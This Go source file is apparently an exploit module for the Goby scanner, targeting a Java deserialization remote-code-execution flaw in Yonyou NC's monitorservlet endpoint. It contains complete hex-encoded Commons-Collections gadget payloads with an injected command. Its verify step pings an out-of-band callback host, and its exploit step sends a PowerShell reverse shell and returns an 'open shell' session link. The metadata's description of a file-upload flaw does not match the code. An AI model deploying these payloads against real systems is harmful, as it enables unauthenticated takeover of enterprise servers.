package exploits

import (
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou NC MonitorServlet Deserialization RCE",
    "Description": "Yonyou NC is an enterprise-level management software, widely used in large and medium-sized enterprises.Realize modeling, development, inheritance, operation, management integration of IT solution information platform.UFIDA NC for C/S architecture, the use of Java programming language development, the client can directly use UClient, the server interface for HTTP.A page of UFIDA NC6.5, there is arbitrary file upload vulnerability.The cause of vulnerability is that there is no type restriction at the uploading file, and an attacker without authentication can take advantage of this vulnerability by sending special data packets to the target system, and a remote attacker who successfully takes advantage of this vulnerability can upload any file to the target system to execute commands.",
    "Product": "Yonyou-NC",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2020-12-07",
    "Author": "go0p",
    "FofaQuery": "app=\"Yonyou-UFIDA-NC\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "AttackType",
            "Type": "select",
            "Value": "goby_shell_powershell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": false,
                "method": "GET",
                "uri": "/service/~baseapp/UploadServlet"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "java.io",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": null,
    "AttackSurfaces": {
        "Application": [
            "Yonyou-UFIDA-NC"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10185"
}`

	ncmonbuildCommandHex := func(cmd string) string {
		cmdHex := fmt.Sprintf("%04x", len(cmd))
		cmdHex += fmt.Sprintf("%x", cmd)
		return cmdHex
	}

	ncmonCommonsCollections6Hex := func(cmd string) string {
		payload := "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174"
		payload += ncmonbuildCommandHex(cmd)
		payload += "740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878"
		return payload
	}
	ncmonCommonsCollections7Hex := func(cmd string) string {
		payload := "aced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174"
		payload += ncmonbuildCommandHex(cmd)
		payload += "740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278"
		return payload
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			gadGetList := make([]string, 0)
			allgadGetList := append(gadGetList, ncmonCommonsCollections6Hex("ping -n 1 "+checkUrl), ncmonCommonsCollections7Hex("ping -n 1 "+checkUrl))
			for _, payloadBStr := range allgadGetList {
				payload, _ := hex.DecodeString(payloadBStr)
				cfg := httpclient.NewPostRequestConfig("/service/monitorservlet")
				cfg.VerifyTls = false
				cfg.FollowRedirect = false
				cfg.Data = string(payload)
				httpclient.DoHttpRequest(hostinfo, cfg)
				if godclient.PullExists(randomHex, time.Second*15) {
					stepLogs.VulURL = hostinfo.String()
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "goby_shell_powershell" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					//httpclient.SetDefaultProxy("http://127.0.0.1:9999")
					cmd := godclient.ReverseTCPByPowershell(rp)
					//fmt.Println(cmd)
					gadGetList := make([]string, 0)
					allgadGetList := append(gadGetList, ncmonCommonsCollections6Hex(cmd), ncmonCommonsCollections7Hex(cmd))
					for _, payloadBStr := range allgadGetList {
						payload, _ := hex.DecodeString(payloadBStr)
						cfg := httpclient.NewPostRequestConfig("/service/monitorservlet")
						cfg.VerifyTls = false
						cfg.FollowRedirect = false
						cfg.Data = string(payload)
						//cfg.Data = fmt.Sprintf(data, payload)
						_, _ = httpclient.DoHttpRequest(expResult.HostInfo, cfg)
						select {
						case webConsleID := <-waitSessionCh:
							log.Println("[DEBUG] session created at:", webConsleID)
							if u, err := url.Parse(webConsleID); err == nil {
								expResult.Success = true
								expResult.OutputType = "html"
								sid := strings.Join(u.Query()["id"], "")
								expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								return expResult
							}
						case <-time.After(time.Second * 10):

						}
					}
				}
			}
			return expResult
		}))
}
